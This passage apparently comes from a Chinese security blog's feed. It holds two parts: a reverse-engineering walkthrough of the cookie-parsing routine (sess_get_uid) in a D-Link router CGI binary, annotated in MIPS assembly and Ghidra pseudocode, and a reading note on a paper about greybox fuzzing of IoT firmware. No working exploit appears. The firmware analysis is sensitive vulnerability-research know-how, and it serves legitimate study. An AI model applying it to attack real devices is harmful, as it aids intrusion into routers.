<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC                                          # sub_403BC8<span class="token operator">+</span>4FCp <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC                 beqz    $a0<span class="token punctuation">,</span> locret_40E1EC <span class="token comment" spellcheck="true">//为0跳转0x40E1EC</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D0                 move    $v1<span class="token punctuation">,</span> $zero
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D4                 lw      $v0<span class="token punctuation">,</span> <span class="token function">0x14</span><span class="token punctuation">(</span>$a0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将0x14处的地址赋给v0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D8                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1DC                 bnez    $v0<span class="token punctuation">,</span> locret_40E1EC 
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E0                 move    $v1<span class="token punctuation">,</span> $v0 <span class="token comment" spellcheck="true">//v0给v1</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E4                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E8                 addiu   $v1<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aHttp1_1301Move<span class="token operator">+</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # <span class="token string">""</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC locret_40E1EC<span class="token punctuation">:</span>                           # CODE XREF<span class="token punctuation">:</span> sobj_get_stringj
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC                                          # sobj_get_string<span class="token operator">+</span>10j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC                 jr      $ra <span class="token comment" spellcheck="true">//v1给v0，然后出去了返回值就是v0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1F0                 move    $v0<span class="token punctuation">,</span> $v1 
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1F0  # End of function sobj_get_string</code></pre>
<p>可以看出该函数的作用是获取参数（sobj_new()中0x14处的堆）的字符串,返回值是v0=sobj_new()中0x14的值。 </p>
<h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>从环境变量中获取对应值：例如getenv(“HTTP_COOKIE”)则函数返回值v0中存放着返回的HTTP_COOKIE=之后的‘uid=xxxxxx’</p>
<p>例如运行前a0是参数是0x41A5cc(0x41a5cc存放的就是字符串’HTTP_COOKIE’)</p>
<p><img src="getenv()1.png" alt=""></p>
<p>getenv()运行完了之后返回结果存放在V0处</p>
<p><img src="getenv()2.png" alt=""></p>
<p> V0=0x76fff32b </p>
<p><img src="getenv()3.png" alt=""></p>
<p>往前一些可以看到0x76fff31f中明显可以看到HTTP_COOKIE=uid=xxxx</p>
<p><img src="getenv()4.png" alt=""></p>
<p>  getenv()也就是将环境变量=之后的内容取出</p>
<h2 id="sobj-strdup-int-param-1"><a href="#sobj-strdup-int-param-1" class="headerlink" title="sobj_strdup(int param_1)"></a>sobj_strdup(int param_1)</h2><p>该函数参数只有一个：也是sobj_new()申请的结构体，整个函数判断流程是，如果a0不等于0则利用strdup将a0+0x14处的堆内容拷贝到一个新申请的空间。</p>
<p>strdup的作用如下：</p>
<p>The <strong>_strdup</strong> function calls <strong>malloc</strong> to allocate storage space for  a copy of <em>strSource</em> and then copies <em>strSource</em> to the allocated  space.</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>globl sobj_strdup
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E830</span> sobj_strdup<span class="token punctuation">:</span>                             # CODE XREF<span class="token punctuation">:</span> sub_406B58<span class="token operator">+</span><span class="token number">60</span>p
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E830</span>                                          # sub_406B58<span class="token operator">+</span>B0p <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E830</span> lui     $gp<span class="token punctuation">,</span> <span class="token number">0x43</span>  # <span class="token string">'C'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E834</span> bnez    $a0<span class="token punctuation">,</span> loc_40E844
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E838</span> li      $gp<span class="token punctuation">,</span> <span class="token number">0x4346D0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E83C jr      $ra
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E840</span> move    $v0<span class="token punctuation">,</span> $zero
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E844</span>  # <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E844</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E844</span> loc_40E844<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strdup<span class="token operator">+</span><span class="token number">4</span>j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E844</span> lw      $a0<span class="token punctuation">,</span> <span class="token function">0x14</span><span class="token punctuation">(</span>$a0<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E848</span> la      $t9<span class="token punctuation">,</span> unk_7676CDA0 <span class="token comment" spellcheck="true">//strdup</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E84C bnez    $a0<span class="token punctuation">,</span> loc_40E85C
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E850</span> nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E854</span> la      $a0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aHttp1_1301Move<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span>      # s
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E85C
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E85C loc_40E85C<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strdup<span class="token operator">+</span>1Cj
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E85C jr      $t9 <span class="token punctuation">;</span> strdup <span class="token comment" spellcheck="true">//strdup</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E860</span> nop</code></pre>
<h1 id="sess-get-uid-undefined4-param-1"><a href="#sess-get-uid-undefined4-param-1" class="headerlink" title="sess_get_uid(undefined4 param_1)"></a>sess_get_uid(undefined4 param_1)</h1><p>最后整体分析一下sess_get_uid()函数，该函数的参数是上一个sobj_new()的结构体地址   </p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sess_get_uid</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token comment" spellcheck="true">//param_1 = a0 = s5 = 0x42e008是sess_get_uid()上一个sobj_new()的返回值</span>
  <span class="token keyword">int</span> string_new<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>strings_new_addr<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>http_cookie<span class="token punctuation">;</span>
  undefined4 uVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar2<span class="token punctuation">;</span>
  <span class="token keyword">int</span> http_cookie_addr<span class="token punctuation">;</span>
  uint flag<span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>pcVar3<span class="token punctuation">;</span>

  string_new <span class="token operator">=</span> <span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//运行完第一次sobj_new()，v0 = 0x42e048并s2 = v0 = 0x42e048</span>
  strings_new_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第二次运行完sobj_new()，v0 = 0x42e068</span>
  http_cookie <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_COOKIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//v0= 'uid=' 将HTTP_COOKIE=后面的值取出，s3 = v0</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string_new <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>strings_new_addr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>http_cookie <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第一个状态</span>
LAB_00407e28<span class="token punctuation">:</span>
    http_cookie_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>http_cookie<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407ec4<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果达到结尾/x00处的时候进入0x407ec4</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
LAB_00407db0<span class="token punctuation">:</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//第一个状态之后进入此处判断是否为';'</span>
        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">/* 遇到= */</span>
        flag <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当遇到'='号时，flag = 2 进入第三个状态</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">!=</span> <span class="token number">0x3d</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果也不是等号就将字符放入第一个sobj_new生成的0x42e048对应的0x14申请的堆空间存储</span>
          <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span>http_cookie_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
          flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//并且将状态标准转化为1进入第二个状态，然后一直加直到把'uid'加进去，遇到等号之后直接跳到LAB_00407e24，跳过'='</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//第一个进入的状态</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">!=</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">sobj_free</span><span class="token punctuation">(</span>string_new<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将s2 = 0x42e048也就是第一次sobj_new生成结构体中的0x14处的堆释放掉并清0</span>
            <span class="token function">sobj_free</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将s3 = 0x42e068也就是第二次sobj_new生成结构体中的0x14处的堆释放掉并清0</span>
            <span class="token keyword">goto</span> LAB_00407db0<span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//进入第三个状态</span>
                    <span class="token comment" spellcheck="true">/* 遇到=后紧接着遇到; */</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//遇到分号进入状态四</span>
          flag <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">,</span>http_cookie_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将uid=之后内容存入s3 = 0x42e068也就是第二次sobj_new生成结构体中的0x14处的堆中，将不等于';'的字符全部输入</span>
        http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* 遇到分号之后比较是否当前字符串是否是uid= */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//进入状态四，比较第一次sobj_new()的s2 = 0x42e048中0x14处的内容是不是'uid'</span>
        iVar1 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span>
        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e40<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
LAB_00407e24<span class="token punctuation">:</span>
    http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
LAB_00407ee0<span class="token punctuation">:</span>
  pcVar3 <span class="token operator">=</span> getenv<span class="token punctuation">;</span>
  pcVar2 <span class="token operator">=</span> <span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">;</span>
LAB_00407e48<span class="token punctuation">:</span>
  uVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>pcVar3<span class="token punctuation">)</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//sobj_get_string(strings_new_addr)获取第二次运行完sobj_new()，s3 = v0 = 0x42e068中0x14处堆中的字符串</span>
  <span class="token function">sobj_add_string</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>uVar1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将得到字符串拷贝到param_1 = s5 = 0x42e008是sess_get_uid()上一个sobj_new()的0x14处堆空间中</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>string_new <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">sobj_del</span><span class="token punctuation">(</span>string_new<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>strings_new_addr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Could not recover jumptable at 0x00407ebc. Too many branches */</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Treating indirect jump as call */</span>
    <span class="token function">sobj_del</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
LAB_00407ec4<span class="token punctuation">:</span>
  iVar1 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进入状态四，比较第一次sobj_new()的s2 = 0x42e048中0x14处的内容是不是'uid'</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
LAB_00407e40<span class="token punctuation">:</span>
    pcVar3 <span class="token operator">=</span> sobj_get_string<span class="token punctuation">;</span>
    pcVar2 <span class="token operator">=</span> strings_new_addr<span class="token punctuation">;</span>
    <span class="token keyword">goto</span> LAB_00407e48<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">goto</span> LAB_00407ee0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>纵观整个函数的功能就是将uid=后面的内容拷贝到param_1的0x14处的堆地址空间。函数的参数是之前sobj_new()申请的结构体地址，地址存储在s5寄存器中，进入函数之后又存储在了s6中。   </p>
<p>完整的流程是：</p>
<p>首先通过两次sobj_new()申请两个结构体并将地址分别存储在s2,s3中。之后利用getenv()将环境变量”HTTP_COOKIE”中的内容也就是’uid=xxxx’字符串的地址放在v0中，紧接着s1=0，s5=0x3b(分号’;’)，s7=0x20(空格’ ‘)其中寄存器s1中存着的是状态标志，不同状态标志进行不同的处理。</p>
<p>s1=0标志着初始状态也就是第一个状态，先判断HTTP_COOKIE环境变量中第一个字符是否是空格，是空格则跳过继续判断，不是空格则先通过sobj_free()将sobj_new()申请的结构体0x14处的堆free并清0。跳转到0x00407db0判断不为0x3b(分号；)，继续判断是否0x3d(等号)，如果都不是，则将该字符通过sobj_add_char()存储在s2中0x14处的堆中，并将s1=1，标志着进入第二个状态。</p>
<p>s1=1第二个状态，不断读取字符串内容直到遇到0x3d(等号)，遇到等号则跳过等号并且s1=2，进入第三个状态。正常而言结束第二个状态时s2+0x14中应该存储的是’uid’。</p>
<p>s1=2第三个状态，将’uid=’之后的字符串内容通过sobj_add_char()存储在s3中0x14处的堆中。如果遇到字符等于0x3b(分号)则将s1=3进入第四个状态，正常结束状态是到遇到结束字符’\x00’处。</p>
<p>s1=3第四个状态，比较s2 = 0x42e048中0x14处的内容是不是’uid’。不是则跳过该字符，并且s1=0重新开始。如果s2 = 0x42e048中0x14处的内容是’uid’。则通过sobj_get_string()将s3中0x14处堆的字符串地址作为返回值给v0。   </p>
<p>之后通过sobj_add_string()将v0的内容给s6的0x14处。到此完成了uid中的内容的获取。最后就是利用sobj_del()将s2、s3中的内容给释放并清空。   </p>
<p>函数返回时，uid的内容存储在之前sobj_new()的结构体s5=0x42e008的0x14处。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实这算第一次这样仔细的阅读并调试汇编源码（虽然还是借助了ghidra的反汇编功能进行理解），还是太菜了呀，整个过程还是花了挺多时间的，但现在看来感觉还是挺值的，因为整个流程下来我对MIPS汇编代码理解以及寄存器的运用还有gdb、IDA的联调有了相对熟练的掌握，为以后静态和动态分析开一个好头吧！然后这篇文章的目的也是为了整理梳理整个思路然后以文字的形式记录下来。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>dlink</tag>
      </tags>
  </entry>
  <entry>
    <title>An Efficient Greybox Fuzzing Scheme for Linux-based IoT Programs Through Binary Static Analysis</title>
    <url>/2020/04/16/lun-wen-yue-du-bi-ji/</url>
    <content><![CDATA[<p>论文链接：</p>
<p><a href="https://ieeexplore.ieee.org/abstract/document/8958740" target="_blank" rel="noopener">https://ieeexplore.ieee.org/abstract/document/8958740</a> </p>
<p>本文发表在  <a href="https://ieeexplore.ieee.org/xpl/conhome/8955479/proceeding" target="_blank" rel="noopener">2019 IEEE 38th International Performance Computing and Communications Conference (IPCCC)</a> ，第一作者是来自中国科学院大学网络安全学院的郑尧文</p>
<h1 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h1><p>随着物联网技术的普及，IoT设备的安全性受到越来越多人的关注，当前很多IoT设备例如网络摄像头和路由器采用阉割版或者轻微改动的linux内核作为它们的操作系统。由于Linux系统的开源性，很多攻击者对其很熟悉，所以该类型IoT设备如果存在漏洞的话容易被攻击。Fuzzing作为当前最为流行的漏洞挖掘测试技术之一。由于IoT设备的特性（一般无源码，需要特定的运行环境），传统Fuzzing技术无法直接应用于IoT设备程序。</p>
<p>本文提出了一种有效的灰盒模糊测试方案，该方案由两步骤组成：二进制静态分析和IoT程序灰盒模糊测试。二进制静态分析为之后的高效Fuzzing提供有效的输入，IoT程序灰盒模糊测试是基于IoT内核Fuzzer进行改进使其适用于IoT程序。</p>
<p>作者实现了原型系统并且实验结果表明该系统能够发现真实的基于Linux的IoT程序漏洞。</p>
<h1 id="设计与实现"><a href="#设计与实现" class="headerlink" title="设计与实现"></a>设计与实现</h1><p>整个系统分为两个部分：</p>
<h2 id="（1）二进制静态分析"><a href="#（1）二进制静态分析" class="headerlink" title="（1）二进制静态分析"></a>（1）二进制静态分析</h2><p>其中第一第二步是从IoT固件中的目标程序中获取候选的关键字，第三四五六步则是分析程序是如何解析和运行候选关键字，如果候选关键字能够提高代码的覆盖率则将其作为“fuzz keywords”。</p>
<p><img src="https://pup2y.github.io/2020/04/16/lun-wen-yue-du-bi-ji/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6.png" alt=""></p>
<p>step1：使用binwalk工具从IoT固件中获取二进制目标程序。</p>
<p>step2：从二进制目标程序的.data和.rodata段中找出所有可读的字符作为候选关键字。</p>
<p>本文使用了污点分析技术，将指向存储可读变量内存地址的指针作为Taint source，将库函数中内存和字符串比较APIs作为Taint sink。</p>
<p>step3：块粒度污点，分析本文将污点分析过程分解为块粒度。构建了一个队列来存储未分析的块，队列中初始块是包含装载当前正在分析的字符串的指令的块。对于每个出队列的块，执行块粒度污点分析。采用了广度优先搜索（<strong>breadth-first-search</strong>）模式。</p>
<p>step4：块转换分析，以确定后继代码块是否进入库函数还是普通代码块，如果是普通代码块则将其加入队列中step3，如果进入了库函数则进入step5。</p>
<p>step5：库函数分析，如果该库函数被定义为Taint sink，则进入step6。否则将根据库函数生成污点流summary完成污点传播分析，并将后继块加入到队列回到step3。</p>
<p>step6：库函数Taint sink分析，判断是否污点分析是否结束。获取step3的污染寄存器以及Taint sink相关寄存器，如果step3的污染寄存器包含在Taint sink相关寄存器中则将当前分析的候选字符串作为fuzz keywords。</p>
<p>库函数生成污点流summary：对库函数进行数据流分析，使用该方法只需要对每个库函数执行一遍库函数分析，而不用像其他普通函数一样进行过程间污点分析。</p>
<p><img src="https://pup2y.github.io/2020/04/16/lun-wen-yue-du-bi-ji/%E5%BA%93%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7.png" alt=""></p>
<h2 id="（2）IoT程序灰盒Fuzzing"><a href="#（2）IoT程序灰盒Fuzzing" class="headerlink" title="（2）IoT程序灰盒Fuzzing"></a>（2）IoT程序灰盒Fuzzing</h2><p>修改全系统灰盒fuzzer（TriforceAFL）使其支持IoT程序灰盒Fuzzing，因为TriforceAFL在执行过程中缺少实时监控器以及对特定进程的准确代码覆盖率收集，所以对IoT程序的Fuzzing并不支持。本文在原有组件的基础上修改了监控组件使其使用于IoT程序。</p>
<p><img src="https://pup2y.github.io/2020/04/16/lun-wen-yue-du-bi-ji/IoT%E7%81%B0%E7%9B%92%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6.png" alt=""></p>
<p>（1）工作流程：首先开始IoT固件仿真包括boot操作系统，同时调用一个fuzz驱动。当系统启动完成之后，fuzz驱动会启动AFL fork服务器，该服务器将派生一个子进程并在其中执行后续操作。在子进程中，驱动会从fuzz引擎中获取一个新的输入，将这个输入喂给目标系统调用，当系统调用结束时退出到父进程。</p>
<p>a)fuzz引擎：使用静态分析获得keywords，使其参与输入生成。因为<strong>AFL通过启用- x模式，将keywords作为字典参与输入的生成</strong>。其他的完全遵从AFL的输入生成策略。最开始种子池中仅包含用户提供的输入，fuzz引擎会从中选择一个进行变异生出输入，并将其喂给目标系统调用，随着Fuzzing迭代的进行，那些能够达到新得代码覆盖的输入被存储作为种子池中的新种子。</p>
<p>b)fork模式：工作流程中提到fuzz驱动会启动AFL fork服务器来,并在fork出的虚拟机中进行接下来的一些列操作。这意味着当一个测试用例结束时，Fuzzing进程会回滚到fork点进行下一次迭代。<strong>fork点是网络相关系统调用</strong>，通过hook这些系统调用完成输入feeding。</p>
<p>c)代码覆盖率：对QEMU系统模式中的分支转换进行插桩，更具体的说是在系统调用的每个代码块执行中，使用当前程序计数器(PC)对最后一个代码块的PC进行编码，然后将值存储在fuzz引擎的bitmap中。当系统调用完成时，fuzz引擎会将bitmap与以前的累积bitmap进行比较，确定是否达到新的代码覆盖。</p>
<p> 2）IoT程序的实时监控器</p>
<p>a)进程监控器：作者遍历Linux内核中的任务结构(task structure)来监控进行的开始和结束。当一个新任务开始时，能够得到的任务信息包括：名字，进程号等，如果等于目标程序的名字，监控器则通知fuzzer目标程序启动起来了，可以进行fork和后续操作。同样的当任务信息中的目标程序信息消失，则说明目标程序终止了。</p>
<p>b)系统调用监控：在系统调用异常之后立即插桩并将其标记为系统调用的起始点，同时获得系统调用信息，例如系统调用号。在进入系统调入之前计入当前PC和栈指针，之后在每个代码块的结束点插桩获得PC和栈指针，与之前的记录进行比较，如果相同说明系统调用结束并返回目标进程。本文监控网络相关的系统调用。</p>
<p>c)上下文分析：当一个新的进程创建的时候，操作系统会设置页面全局目录(PGD)，不同进程的PGD不同，所以可以通过PGD来鉴别进程。</p>
<h1 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h1><p>本系统的二进制分析模块是基于IDAPython编写的python代码，Fuzzing模块是基于TriforceAFL进行修改的。系统仿真是借助Firmadyne工具，所以从Firmadyne的数据库中选取了6个固件进行测试。对其中的HTTP服务进行Fuzzing，从中选取了7个http相关的程序。</p>
